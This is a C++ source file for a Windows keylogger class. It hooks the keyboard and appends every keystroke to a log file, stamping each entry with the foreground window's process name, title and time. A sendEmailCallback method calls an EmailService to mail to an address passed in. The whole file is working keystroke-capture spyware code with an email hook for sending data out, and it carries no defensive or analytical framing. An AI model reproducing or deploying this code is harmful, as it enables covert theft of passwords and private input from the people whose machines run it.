#include "stdafx.h"
#include "Keylogger.h"

char Keylogger::charBuffer[1024];

void Keylogger::start() {
	hook = new Hook();
	//std::function<void(wchar_t[])> callback = std::bind(&Keylogger::keyboardHandler, this);
	hook->setHook([this](const wchar_t key[]) {
		keyboardHandler(key);
	});

	logFile.open(FILENAME, std::ios::app);
}

void Keylogger::keyboardHandler(const wchar_t* keyText) {
	addWindowTimeStamps();
		
	auto symbol = keyText;
	logFile << wcharToStr(keyText) << std::flush;
	std::cout << wcharToStr(keyText) << std::flush;
}

void Keylogger::addWindowTimeStamps() {
	// Get window title and write it to file
	HWND currentWindow = GetForegroundWindow();
	if (currentWindow != lastActiveWindow) {
		lastActiveWindow = currentWindow;

		const int bufferSize = 1024;
		wchar_t bufferProcessName[bufferSize];
		wchar_t bufferTitle[bufferSize];

		// Get process name
		DWORD processId;
		GetWindowThreadProcessId(currentWindow, &processId);
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
		GetModuleFileNameEx(hProcess, NULL, bufferProcessName, bufferSize);

		// Get windows title
		GetWindowText(currentWindow, bufferTitle, bufferSize);

		tm* localTime;
		time_t t = time(NULL);
		localTime = localtime(&t);
		char timeStrBuffer[80];
		strftime(timeStrBuffer, 80, "%F %X", localTime);

		if (bufferTitle == nullptr || bufferTitle[0] == '\0') {
			std::cout << "!!!!ploho!!!";
		} else {
			std::cout << "\n### " << wcharToStr(bufferProcessName) << " --- " << wcharToStr(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
		}
		logFile << "\n### " << wcharToStr(bufferProcessName) << " --- " << wcharToStr(bufferTitle) << " ### " << timeStrBuffer << " ###\n";
	}
}

string Keylogger::wcharToStr(const wchar_t* str) {
	CharToOemW(str, charBuffer);	
	return string(charBuffer);
}

void Keylogger::stop() {
	hook->unsetHook();
	logFile.close();
}

Keylogger::~Keylogger() {
	stop();
	delete hook;
}

bool Keylogger::sendEmailCallback(std::string emailTo) {
	auto emailService = make_shared<EmailService>();
	return emailService->sendEmail("Test", "test", emailTo);
}
